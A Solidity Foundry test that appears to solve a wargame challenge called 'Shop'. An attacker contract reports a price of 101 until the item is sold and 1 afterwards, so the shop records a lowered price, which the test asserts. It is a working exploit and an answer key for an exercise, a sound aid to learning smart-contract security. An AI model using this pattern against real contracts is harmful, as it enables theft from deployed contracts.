// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/21_Shop.sol";

contract AttackShop {
    Shop _shop;
    bool priceHit = false;
    constructor(address _shopAddress){
        _shop = Shop(_shopAddress);
    }

    function buy() public{
        _shop.buy();
    }

    function price() public view returns(uint){
        if(_shop.isSold()){
            return 1;
        }else{
            return 101;
        }
    }
}

contract ShopTest is Test {
    Shop _shop;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _shop = new Shop();
    }

    function testSolution() public {
        vm.startPrank(attacker);

        AttackShop _attackShop = new AttackShop(address(_shop));
        _attackShop.buy();

        assertTrue(_shop.price() < 100, "Price has not been lowered!");
    }
}
